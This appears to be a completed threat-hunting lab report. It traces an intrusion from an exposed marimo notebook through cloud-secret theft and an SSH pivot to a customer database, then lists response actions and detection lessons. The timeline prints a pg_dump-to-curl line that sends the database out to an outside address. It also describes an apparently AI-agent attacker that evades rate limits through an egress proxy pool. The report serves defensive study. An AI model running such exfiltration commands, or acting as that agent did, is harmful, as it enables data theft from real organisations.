| 1 | 1 | Exploited endpoint | `GET /ws/kernel` |
| 1 | 2 | Named weakness | CVE-2026-39987 |
| 1 | 3 | Staging address | 198.51.100.23 |
| 1 | 4 | Spawned interpreter | `python3.12`, PID 5211, parent `marimo edit --host 0.0.0.0 --no-token` |
| 2 | 1 | Stolen cloud identity | `arn:aws:iam::402913776148:user/svc-notebook` |
| 2 | 2 | Metadata-service PID | Assumption does not hold — network log shows PID 5211 |
| 2 | 3 | ATLAS mapping | AML.T0098, Realized |
| 3 | 1 | Access key behind every call | `AKIA4TIDEGLASS0EXAMPLE` |
| 3 | 2 | Throttle and retry | 11:22:41 → 11:23:05, 203.0.113.71 → 203.0.113.94 |
| 3 | 3 | Egress pool | 6 addresses, 203.0.113.71/.94/.118/.142/.167/.203 |
| 3 | 4 | Evasion technique | T1090.003 Multi-hop Proxy |
| 4 | 1 | Secret stolen | `prod/bastion/ssh-deploy-key` at 11:31:16 |
| 4 | 2 | Recon versus theft | `ReadOnly` = false |
| 4 | 3 | Cloud log limit | Cannot recover key material — `VersionId` only |
| 5 | 1 | Key on disk → login | `/tmp/.c/id_ed25519`, `deploy`, `gf-tg-bastion01` |
| 5 | 2 | Login discriminator | `TargetUsername` = `deploy` |
| 5 | 3 | Key fingerprint | `ED25519 SHA256:mNq7xR2vTbY8kLpJ4wZaHc1oUeVgX5tDsFj0rWnAE` |
| 6 | 1 | Recon command and target | `psql`, `customers` |
| 6 | 2 | Rows established pre-dump | 2,841,902 |
| 6 | 3 | Exfil tool and destination | `pg_dump` → 203.0.113.41:8443 |
| 6 | 4 | Proof from the target | `database` = `customers` |
| 6 | 5 | Not the nightly backup | account `deploy`, destination 203.0.113.41 |
| 7 | 1 | Attacker session | `tg-4b81e0d7` |
| 7 | 2 | Autonomy verdict | human-tasked |
| 8 | 1 | python3.12 discriminator | `ActingProcessCommandLine` = marimo launch line |
| 8 | 2 | Metadata-read discriminator | `ActingProcessName` = `python3.12` |
| 8 | 3 | Secret-read discriminator | Source network (203.0.113.142) + SecretId = bastion deploy key |
| 8 | 4 | Timing signature | Continuous, ~52 minutes |

---

## 🧭 Attack Timeline
| Time (UTC) | Event | Host |
|------------|-------|------|
| 11:05:00 | `GET /ws/kernel` — HTTP 101 WebSocket upgrade from 198.51.100.23 (CVE-2026-39987) | gf-tg-nb01 |
| 11:05:02 | Kernel session opens, uid=marimo; agent session `tg-4b81e0d7` begins | gf-tg-nb01 |
| 11:05:0x | `python3.12` PID 5211 spawned by `marimo edit --host 0.0.0.0 --no-token` | gf-tg-nb01 |
| 11:08:09 | Environment read — access key ID present, secret key absent | gf-tg-nb01 |
| 11:08:12 | Single connection to 169.254.169.254, attributed to PID 5211 | gf-tg-nb01 |
| 11:08:19 | Role credentials held for `svc-notebook` | — |
| 11:11:19 | Secrets Manager enumeration begins from 203.0.113.71 | — |
| 11:22:41 | `ListSecrets` throttled — `ThrottlingException` from 203.0.113.71 | — |
| 11:22:44 | Agent redistributes across Cloudflare Workers pool | — |
| 11:23:05–15 | Five further egress addresses enter service in 11 seconds | — |
| 11:31:16 | `GetSecretValue` — `prod/bastion/ssh-deploy-key`, `ReadOnly=false`, from 203.0.113.142 | — |
| 11:31:20 | Key written to `/tmp/.c/id_ed25519`, mode 600 | gf-tg-nb01 |
| 11:34:31 | SSH to bastion as `deploy` — ED25519 SHA256:mNq7xR2v… | gf-tg-bastion01 |
| 11:37:40 | `psql … '\dt+' \| sort -k7 -h \| tail -5` — tables enumerated by size | gf-tg-bastion01 |
| 11:37:42 | `customers` selected — 2,841,902 rows | gf-tg-pg01 |
| 11:40:49 | `pg_dump … \| gzip \| curl -T - https://203.0.113.41:8443/u` | gf-tg-bastion01 |
| 11:40:4x | Postgres logs `connection authorized … database=customers` | gf-tg-pg01 |
| 11:57:00 | Transfer complete — operation ends | — |

---

## 🛡️ Response Actions Taken
- Isolated all three hosts and preserved them for forensic imaging
- Patched marimo for CVE-2026-39987 and removed the notebook server from external exposure
- Restarted marimo without `--host 0.0.0.0` and with token authentication enabled — the exposed, unauthenticated launch flags were the root cause
- Rotated `prod/bastion/ssh-deploy-key` and revoked the key with fingerprint `ED25519 SHA256:mNq7xR2vTbY8kLpJ4wZaHc1oUeVgX5tDsFj0rWnAE` across the estate; the key material was unrecoverable from CloudTrail, so full compromise was assumed
- Disabled and reissued access key `AKIA4TIDEGLASS0EXAMPLE` and reviewed every action taken by `svc-notebook` in the window
- Blocked 198.51.100.23 and 203.0.113.41 at the perimeter; alerted on the full 203.0.113.0/24 Workers pool
- Enforced IMDSv2 on the notebook instance and restricted metadata access to the credential-helper process
- Scoped the breach at 2,841,902 customer records and initiated notification procedures on that figure
- Reviewed `deploy` account usage estate-wide and restricted the deploy key to non-interactive CI use
- Reviewed all other sessions in `LLMAgentLogs_CL` for further non-estate actors
- Shared IOCs and query logic with the Blue Team for detection rule creation

---

## 📘 Lessons Learned
- **Do not chain a pivot value across tables without confirming it.** Shell history showed `curl` fetching the metadata service, but the network log attributed that socket to the parent interpreter. Searching for the curl PID returns zero rows, and zero rows reads as *nothing happened* rather than *wrong value*. Confirm the pivot field exists in the destination table before treating an empty result as evidence.
- **The account beats the tool, every time.** `pg_dump` runs nightly by design. `publickey` is how all 318 legitimate admin logins authenticate. `python-httpx` is the estate's own client. In all three cases the tool was shared and the identity was the discriminator. A rule keyed on a binary name pages an analyst nightly and buries the real event in its own noise.
- **Process lineage outlives payloads.** 74 `python3.12` spawns, identical binary, same user, overlapping timing — and only one parented by a web server. Swap the interpreter and the parent stays marimo.
- **Rotating addresses does nothing if the credential is static.** Six egress addresses cycled in eleven seconds, all presenting `AKIA4TIDEGLASS0EXAMPLE`. Evasion worked at the network layer and failed completely at the identity layer.
- **Keep the address sets separate.** Three roles, three distinct sets: staging (198.51.100.23), the Workers pool (203.0.113.0/24), and the exfil drop (203.0.113.41). Conflating them produces a wrong incident narrative and wrong blocklists.
- **Naming a gap correctly is a finding.** CloudTrail records that a secret was read and returns a `VersionId` — never the value. That limit is by design, and stating it plainly is the right answer. It also drives the remediation: because we cannot know what was taken, we rotate as though all of it was.
- **When the attacker's host gives you nothing, ask the target.** The dump was piped through `gzip` into `curl` and never touched disk, so there was no file to find. PostgreSQL still logged `database=customers` against a host that otherwise only ever logs `greenfield_platform`. The server being read from always knows it was read.
- **Test an indicator against the baseline before calling it a tell.** `python-httpx/0.27.0` looked like clear automation evidence until all 22 `GetSecretValue` calls were pulled and the estate's own application turned out to use the same client. An indicator that is damning in isolation can be background once the baseline is actually queried.
- **An agent narrates what a human would never write down.** The CVE named before exploitation, the reasoning behind choosing `customers`, the decision to spread across an egress pool — all recorded by the attacker itself. Use it to build the hypothesis fast, then prove every step against the boring tables the attacker did not control.
- **Human-tasked is its own category.** One sentence of intent, then fifty-two unattended minutes across three hosts and a cloud account. The response question is not *who was at the keyboard* but *who wrote the instruction* — and the defensive question is how long an estate survives an adversary that never pauses, never fumbles, and adapts to a rate limit in under half a minute.

Report Completed By: Wilson Siano Status: ✅ All flags investigated and confirmed
